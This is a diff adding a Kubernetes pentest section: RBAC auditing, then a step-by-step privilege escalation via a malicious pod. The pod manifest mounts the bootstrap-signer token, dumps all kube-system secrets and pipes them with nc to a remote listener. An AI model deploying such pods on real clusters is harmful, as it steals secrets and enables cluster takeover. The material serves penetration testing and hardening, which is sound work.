@@ -135,11 +135,91 @@ mount | grep kubernetes
 ls /var/run/secrets/kubernetes.io/serviceaccount
 ```
 
+#### RBAC Testing (Whitebox)
+
+Role-based access control (RBAC) is used for regulating access to kubernetes resources. After having enough permissions to export the roles and permissions, these can be analyzed offline using the ExtensiveRoleCheck python tool.
+
+```
+python ExtensiveRoleCheck.py --clusterRole clusterroles.json  --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json
+```
+
+#### Privilege Escalation Via Malicious Pod Creation
+
+An attacker who gains control of a service account with the privilege to create pods in the **"kube-system"** namespace can potentially escalate privileges by reading tokens from other privileged service accounts. By default, the “bootstrap-signer” service account has the privilege to list all tokens in the cluster 
+
+Step 1. We check if the bootstrap-signer service account has privileges to list all tokens
+
+```
+kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml
+```
+
+Step 2. Create an "evil" pod that will mount the "bootstrap-signer" service account token
+
+Step 2.1. Create a YAML file that describes the pod, mounts the "bootstrap-signer" and reads all the secrets from the API server and sends them to our remote listener
+
+malicious-pod.yaml:
+
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: alpine
+  namespace: kube-system
+spec:
+  containers:
+  - name: alpine
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 443; sleep 100000']
+  serviceAccountName: bootstrap-signer
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+Step 3. Launch the netcat listener
+
+```
+nc -nlvp 443
+```
+
+Step 4. Create the "evil" pod
+
+```
+kubectl apply -f malicious-pod.yaml
+```
+
+**Evil pods can also be created by crafting malicious yaml files of other objects suchs as daemonsets, replicasets, jobs etc. which support the "PodTemplateSpec":**
+
+(https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podtemplatespec-v1-core)
+
+```
+DaemonSetSpec [apps/v1]
+DaemonSetSpec [apps/v1beta2]
+DaemonSetSpec [extensions/v1beta1]
+DeploymentSpec [apps/v1]
+DeploymentSpec [apps/v1beta2]
+DeploymentSpec [apps/v1beta1]
+DeploymentSpec [extensions/v1beta1]
+JobSpec [batch/v1]
+PodTemplate [core/v1]
+ReplicaSetSpec [apps/v1]
+ReplicaSetSpec [apps/v1beta2]
+ReplicaSetSpec [extensions/v1beta1]
+ReplicationControllerSpec [core/v1]
+StatefulSetSpec [apps/v1]
+StatefulSetSpec [apps/v1beta2]
+StatefulSetSpec [apps/v1beta1]
+```
+
+
+
 ### Tools
 
 * [peirates](https://github.com/inguardians/peirates) - a Kubernetes penetration tool, enables an attacker to escalate privilege and pivot through a Kubernetes cluster. It automates known techniques to steal and collect service accounts, obtain further code execution, and gain control of the cluster.
 
 * [kube-hunter](https://github.com/aquasecurity/kube-hunter) - hunts for security weaknesses in Kubernetes clusters.
+
+* [ExtensiveRoleCheck](https://github.com/cyberark/kubernetes-rbac-audit) - is a Python tool that scans the Kubernetes RBAC for risky roles.
 
 * [kubeaudit](https://github.com/Shopify/kubeaudit) - is a command line tool to audit Kubernetes clusters for various different security concerns: run the container as a non-root user, use a read only root filesystem, drop scary capabilities, don't add new ones, don't run privileged etc.
 
@@ -147,3 +227,6 @@ ls /var/run/secrets/kubernetes.io/serviceaccount
 
 * [katacoda](https://katacoda.com/) - Learn Kubernetes using interactive broser-based scenarios.
 
+### References 
+
+* [Default Roles and RoleBindings](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#default-roles-and-role-bindings) 
